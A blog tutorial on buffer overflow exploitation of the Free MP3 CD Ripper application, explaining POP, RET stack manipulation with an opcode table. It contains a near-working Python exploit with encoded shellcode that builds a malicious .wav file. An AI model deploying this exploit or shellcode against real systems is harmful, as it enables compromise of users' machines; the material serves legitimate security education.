---
title: 'Buffer Overflow Exploitation: Stack manipulation using POP, RET'
categories:
- Tutorials
---
Exploiting is a very interesting topic and there are many ways of manipulating the stack. One of those ways is using the POP, RET functions.

Using the "Free MP3 CD Ripper" - Exploit from my [first tutorial](https://www.rcesecurity.com/2011/11/30/buffer-overflow-a-real-world-example/ "Buffer Overflow Exploitation: A real world example"), I would like to show how a POP RET is basically working (and displayed in IDA), since these are useful commands if the shellcode is not directly placed @ the ESP, but only some bytes away from it on the stack, like ESP+4 or ESP+8...The modified Python script helps to show how jumping to shellcode via a POP, RET will work:

{% highlight python %}
from struct import pack

file="fuzzing.wav"
junk="\\x41"\*4112
eip=pack('<I',0x639D1575) #pop eax,ret from vorbis.dll (loaded @639C0000)
nops = "\\x90" \* 4
ret=pack('<I',0x1511EDFF)
nops2 = "\\x90" \* 2
breakit = "\\xCC" \* 1
shellcode = ("\\xdb\\xc0\\x31\\xc9\\xbf\\x7c\\x16\\x70\\xcc\\xd9\\x74\\x24\\xf4\\xb1\\x1e"
"\\x58\\x31\\x78\\x18\\x83\\xe8\\xfc\\x03\\x78\\x68\\xf4\\x85\\x30\\x78\\xbc\\x65\\xc9\\x78"
"\\xb6\\x23\\xf5\\xf3\\xb4\\xae\\x7d\\x02\\xaa\\x3a\\x32\\x1c\\xbf\\x62\\xed\\x1d\\x54\\xd5"
"\\x66\\x29\\x21\\xe7\\x96\\x60\\xf5\\x71\\xca\\x06\\x35\\xf5\\x14\\xc7\\x7c\\xfb\\x1b\\x05"
"\\x6b\\xf0\\x27\\xdd\\x48\\xfd\\x22\\x38\\x1b\\xa2\\xe8\\xc3\\xf7\\x3b\\x7a\\xcf\\x4c\\x4f"
"\\x23\\xd3\\x53\\xa4\\x57\\xf7\\xd8\\x3b\\x83\\x8e\\x83\\x1f\\x57\\x53\\x64\\x51\\xa1\\x33"
"\\xcd\\xf5\\xc6\\xf5\\xc1\\x7e\\x98\\xf5\\xaa\\xf1\\x05\\xa8\\x26\\x99\\x3d\\x3b\\xc0\\xd9"
"\\xfe\\x51\\x61\\xb6\\x0e\\x2f\\x85\\x19\\x87\\xb7\\x78\\x2f\\x59\\x90\\x7b\\xd7\\x05\\x7f"
"\\xe8\\x7b\\xca")
writeFile = open (file, "w")
writeFile.write(junk+eip+nops+ret+nops2+breakit+shellcode)
writeFile.close()
{% endhighlight %}

The .wav gets filled by our usual 4112 bytes of junk first. After that we've got the already known position of our EIP, where we'll fill in a "POP EAX, RET" (opcode: 58 C3 - have a look at the opcode\-table at the end of this posting) stolen from the loaded "vorbis.dll". But what does a "POP EAX" and a "RET" do exactly ? The"POP EAX" takes 4 bytes off the top of the stack and directly stores them into the EAX and "RET" loads the following 4 bytes at ESP into EIP, and therefor gets executed. :-) By the way if the shellcode is 8 bytes away (ESP+8) you simply need to find a "POP, POP, RET" function to jump...

For demonstration purposes, I'll add another 4 nop\-bytes "\\x90" after the EIP. Those bytes will be POP'ed to the EAX. The next 4 stack bytes - our already known "JMP ESP" - will used by the RET function. The following 2 nop\-bytes and the "\\xCC", which simply breaks the process, will be used to realign the stack. Execute the application, load our new malicious .wav and have a look at the general registers and the stack view now:

![]({{ site.baseurl }}/assets/popret.png "popret")

The stack view clearly shows you what did happen and what we expected! First: The EIP loaded 0x1BDFEE4 which stores our stolen POP, RET functions from vorbis.dll. Followed by our pseudo-nops "90909090", which are POP'ed to the EAX using the mentioned function from vorbis.dll. Have a look at the general registers, where you can see that the EAX contains exactly "90909090". Great! The pop works fine so far. Now the ret gets executed @0x1BDFEEC which contains our stolen "JMP ESP" from "WMVCore.dll". Then we've got some other nops again to realign the Stack (notice that the ESP is @0x1BDFEF0), which means we only need 3 further bytes to point directly to our shellcode. (I've just added 2 nops and a break here to break the application flow). In the final version of the exploit simply exchange the "\\xCC" with a further nop and the exploit will work again :-).

A nice collection of opcodes:
{% highlight python %}
\* ASM Code:
call eax  FF D0
call ebx  FF D3
call ecx  FF D1
call edx  FF D2
call edi  FF D7
call esi  FF D6
call esp  FF D4
call ebp  FF D5

call \[eax\] FF 10
call \[ebx\] FF 13
call \[ecx\] FF 11
call \[edx\] FF 12
call \[edi\] FF 17
call \[esi\] FF 16
call \[esp\] FF 14 24
call \[ebp\] FF 55 00

jmp eax  FF E0
jmp ebx  FF E3
jmp ecx  FF E1
jmp edx  FF E2
jmp edi  FF E7
jmp esi  FF E6
jmp esp  FF E4
jmp ebp  FF E5

jmp \[eax\]  FF 20
jmp \[ebx\]  FF 23
jmp \[ecx\]  FF 21
jmp \[edx\]  FF 22
jmp \[edi\]  FF 27
jmp \[esi\]  FF 26
jmp \[esp\]  FF 24 24
jmp \[ebp\]  FF 65 00

push eax  50
push ebx  53
push ecx  51
push edx  52
push edi  57
push esi  56
push esp  54
push ebp  55

push \[eax\] FF 30
push \[ebx\] FF 33
push \[ecx\] FF 31
push \[edx\] FF 32
push \[edi\] FF 37
push \[esi\] FF 36
push \[esp\] FF 34 24
push \[ebp\] FF 75 00

pop eax  58
pop ebx  5B
pop ecx  59
pop edx  5A
pop edi  5F
pop esi  5E
pop esp  5C
pop ebp  5D

ret         C3
{% endhighlight %}
